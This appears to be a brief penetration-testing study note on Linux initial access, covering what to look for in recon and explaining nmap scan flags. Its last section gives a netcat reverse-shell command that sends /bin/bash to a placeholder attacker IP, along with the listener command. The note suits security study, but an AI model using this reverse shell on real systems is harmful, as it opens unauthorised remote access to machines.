# linux - initial access

### recon

Look for:

* insecure services on open ports
* common protocols
* insecure version of software
* websites, login pages, ssh, databases, ftp
* scripts, misconfigured permissions, other vulns

Common things

* weak creds
* generous permissions
* vague variables

### nmap

##### flags

* `-sS` - TCP syn port scan
  * we send SYN, server sends ACK or SYN/ACK, that means port is open
  * stealthy scan and very fast
  * default w/ root
* `-sT` - TCP connect port scan
  * establishes full connection then tears down connection
  * default w/out root
* `-sU` - UDP port scan
  * scans for UDP ports
* `-sA` - TCP ack port scan
  * uses packets with only ACK flag, check whether firewall is stateful or stateless
* `-sC` - default scripted scan
* `-sV` - version lookup
* `-oA` - output in all formats
* `-v` - verbose

##### sample

```bash
nmap <ip-address>
```

### netcat

* `nc <attacker-ip> <port-number> -c /bin/bash`

* `nc -nvlp <port-number>`